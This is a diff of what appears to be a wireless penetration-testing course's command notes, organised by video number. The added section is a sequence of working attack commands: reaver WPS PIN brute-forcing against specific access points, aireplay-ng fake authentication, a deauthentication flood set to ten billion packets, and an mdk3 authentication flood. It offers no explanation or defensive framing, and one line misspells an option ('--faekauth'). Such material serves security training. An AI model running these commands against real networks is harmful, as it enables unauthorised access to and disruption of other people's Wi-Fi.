@@ -41,7 +41,7 @@ v-14)
 
 9) airodump-ng mon0 
 
-10) airodump-ng --bssid 00:10:18:90:2D:EE --channel l --write ska-test mon0
+10) airodump-ng --bssid 00:10:18:90:2D:EE --channel 1 --write ska-test mon0
 
 11) aireplay-ng --fakeauth 0 -a 00:10:18:90:2D:EE -h 00:C0:CA:82:82:98 mon0 
 
@@ -87,7 +87,7 @@ v-19)
 
 12) service apache2 start 
 
-13)apt-get install geany
+13) apt-get install geany
 
 v-23)
 
@@ -134,6 +134,36 @@ v-28)
 
 29) wireshark 
 
-30) 
+
+Section -5
+
+1) wash -i mon0 
+
+2) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 
+
+3) aireplay-ng --fakeauth 100 -a 5C:A8:6A:16:A0:4C -h 00:C0:CA:82:82:98 mon0                
+
+4) ifconfig mon0
+
+5) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A 
+
+6) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A -vvv
+
+7) aireplay-ng --faekauth 100 -a 5C:A8:6A:16:A0:4C -h 00:C0:CA:82:82:98 mon0 
+
+8) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A -vvv --no-nacks 
 
 
+v-32)
+
+9) wash -i mon0 
+
+10) reaver -b 00:10:18:90:2D:EE -c 11 -i mon0 
+
+11) reaver -b 54:67:51:C8:D4:10 -c 6 -i mon0 
+
+12) aireplay-ng --deauth 10000000000 -a 54:67:51:C8:D4:10 -i mon0 
+
+13) mdk3 -i mon0 a -a 54:67:51:C8:D4:10 -m 
+
+14) reaver -b 54:67:51:C8:D4:10 -c 6 -i mon0 
